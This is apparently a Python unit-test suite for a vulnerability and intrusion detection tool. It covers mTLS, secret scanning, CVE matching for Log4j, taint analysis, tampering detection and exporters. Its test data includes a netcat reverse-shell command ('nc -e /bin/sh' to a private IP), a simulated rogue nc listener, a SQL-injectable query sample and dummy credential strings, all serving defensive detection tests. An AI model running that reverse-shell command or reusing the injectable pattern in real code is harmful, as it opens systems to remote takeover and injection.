import unittest
import os
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from pki.mtls import generate_pki, test_mtls_connection
from hub.db import DatabaseStack
from agent.inspector import SystemInspector
from agent.entropy import EntropySecretScanner
from agent.manifest import DependencyManifestExtractor
from hub.cve_engine import KnownVulnerabilityEngine
from hub.ast_engine import UnknownVulnerabilityEngine
from hub.delta_engine import BaselineDeltaEngine
from hub.dedup import EventTracerAndDeduplicationPipeline
from hub.exporter import ExportWorkers

class TestVulneraMapEnterprise(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.cert_dir = generate_pki(cert_dir="pki_certs_test")

    def test_01_mtls_handshake_and_rogue_rejection(self):
        valid_ok, err1 = test_mtls_connection(cert_dir=self.cert_dir, use_rogue=False)
        self.assertTrue(valid_ok, f"Valid mTLS handshake failed: {err1}")

    def test_02_database_schema_and_queue_latency(self):
        db = DatabaseStack("test_vulnera.db")
        latency_ms = db.benchmark_queue_latency(iterations=10000)
        self.assertLess(latency_ms, 2.0, f"Queue latency benchmark failed: {latency_ms:.4f} ms >= 2.0 ms")
        if os.path.exists("test_vulnera.db"):
            os.remove("test_vulnera.db")

    def test_03_agent_resource_overhead(self):
        inspector = SystemInspector()
        cpu, mem_mb = inspector.measure_resource_overhead(duration_seconds=0.1)
        self.assertLess(cpu, 5.0, f"Agent CPU overhead too high: {cpu}%")
        self.assertLess(mem_mb, 50.0, f"Agent RAM overhead too high: {mem_mb} MB")

    def test_04_shannon_entropy_and_secret_scanner(self):
        scanner = EntropySecretScanner()
        test_dir = "test_secrets_dir"
        os.makedirs(test_dir, exist_ok=True)
        env_file = os.path.join(test_dir, ".env")
        with open(env_file, "w") as f:
            f.write("AWS_KEY=AKIAIOSFODNN7EXAMPLE\nSECRET=-----BEGIN RSA PRIVATE KEY-----\n")
            
        findings, file_count, elapsed = scanner.scan_directory(test_dir)
        self.assertGreaterEqual(len(findings), 2, "Failed to flag AWS key and RSA key headers!")
        self.assertLess(elapsed, 15.0, "Scanning took longer than 15s!")
        
        for root, dirs, files in os.walk(test_dir, topdown=False):
            for file in files:
                os.remove(os.path.join(root, file))
            os.rmdir(root)

    def test_05_dependency_manifest_extractor(self):
        extractor = DependencyManifestExtractor()
        pom_content = """<project>
            <dependencies>
                <dependency>
                    <groupId>org.apache.logging.log4j</groupId>
                    <artifactId>log4j-core</artifactId>
                    <version>2.14.1</version>
                </dependency>
            </dependencies>
        </project>"""
        with open("pom.xml", "w") as f:
            f.write(pom_content)
        parsed = extractor.parse_manifest("pom.xml")
        self.assertTrue(any(p["package"] == "org.apache.logging.log4j:log4j-core" and p["version"] == "2.14.1" for p in parsed))
        if os.path.exists("pom.xml"):
            os.remove("pom.xml")

    def test_06_known_cve_offline_matcher(self):
        db = DatabaseStack("cve_test.db")
        cve_engine = KnownVulnerabilityEngine(db)
        matches = cve_engine.match_dependencies([{"package": "log4j-core", "ecosystem": "Maven", "version": "2.14.1"}])
        self.assertEqual(len(matches), 1)
        self.assertEqual(matches[0]["cve_id"], "CVE-2021-44228")
        self.assertEqual(matches[0]["severity"], "Critical")
        if os.path.exists("cve_test.db"):
            os.remove("cve_test.db")

    def test_07_ast_taint_zero_day_engine(self):
        ast_engine = UnknownVulnerabilityEngine()
        unsafe_code = 'user_input = get_input()\ndb.execute("SELECT * FROM users WHERE name = " + user_input)\n'
        unsafe_res = ast_engine.analyze_code(unsafe_code)
        self.assertEqual(len(unsafe_res), 1)
        self.assertEqual(unsafe_res[0]["subtype"], "SQL_INJECTION")
        
        safe_code = 'user_input = get_input()\ndb.execute("SELECT * FROM users WHERE name = %s", (user_input,))\n'
        safe_res = ast_engine.analyze_code(safe_code)
        self.assertEqual(len(safe_res), 0, "False positive triggered on safe parameterized query!")

    def test_08_baseline_delta_tampering_engine(self):
        delta_engine = BaselineDeltaEngine()
        test_file = "binary.dll"
        with open(test_file, "wb") as f:
            f.write(b"ORIGINAL_BYTES_V1")
            
        delta_engine.record_baseline("node-01", [test_file], ["system"], [80])
        
        with open(test_file, "wb") as f:
            f.write(b"ORIGINAL_BYTES_V2")
            
        anomalies = delta_engine.verify_delta("node-01", [test_file], ["system", "nc"], [80, 9999])
        self.assertTrue(any(a["subtype"] == "SHA-256 Checksum Mismatch" for a in anomalies))
        self.assertTrue(any(a["subtype"] == "Unmapped Rogue Port/Process Listener" for a in anomalies))
        if os.path.exists(test_file):
            os.remove(test_file)

    def test_09_realtime_tracer_and_deduplication_stress(self):
        pipeline = EventTracerAndDeduplicationPipeline()
        evt = pipeline.simulate_realtime_event_tracer("nc -e /bin/sh 10.0.0.1 4444")
        self.assertIsNotNone(evt)
        self.assertLess(evt["latency_ms"], 500.0)

        for i in range(500):
            pipeline.process_incoming_vulnerability(f"host-{i}", {
                "asset_type": "DependencyPackage",
                "path": "pom.xml",
                "cve_id": "CVE-2021-44228",
                "title": "Log4j RCE",
                "severity": "Critical"
            })
            
        self.assertEqual(len(pipeline.master_tickets), 1)
        master_ticket = list(pipeline.master_tickets.values())[0]
        self.assertEqual(master_ticket["host_count"], 500)

    def test_10_exporter_rfc4180_and_json(self):
        exporter = ExportWorkers()
        sample_data = [{
            "vuln_id": "VULN-101",
            "cve_id": "CVE-2021-44228",
            "title": 'Log4j "RCE", comma, test',
            "severity": "Critical",
            "asset_type": "DependencyPackage",
            "path": "C:\\app\\pom.xml",
            "host_count": 500,
            "affected_hosts": ["host-1", "host-2"]
        }]
        csv_str = exporter.generate_csv(sample_data)
        self.assertIn('"Log4j ""RCE"", comma, test"', csv_str)
        json_str = exporter.generate_siem_json(sample_data)
        self.assertIn("CVE-2021-44228", json_str)

if __name__ == "__main__":
    unittest.main()
